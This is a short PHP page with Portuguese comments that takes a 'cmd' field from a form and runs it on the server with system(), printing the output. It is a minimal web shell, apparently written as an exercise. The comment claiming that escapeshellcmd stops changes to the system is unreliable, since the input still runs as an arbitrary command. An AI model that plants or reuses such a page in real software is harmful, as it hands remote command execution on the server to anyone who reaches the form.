<?php 

if ($_SERVER["REQUEST_METHOD"] === 'POST') {
	//Comando do Windows: Não permite alterar o sistema nem escrever nele, como o mkdir, por exemplo
	$cmd = escapeshellcmd($_POST["cmd"]); 

	echo "<pre>";
	$comando = system($cmd, $retorno); // Ex de entrada: dir C:\
	echo "</pre>";
}

?>

<form method="post">

	<input type="text" name="cmd">
	<button type="submit">Enviar</button>
	
</form>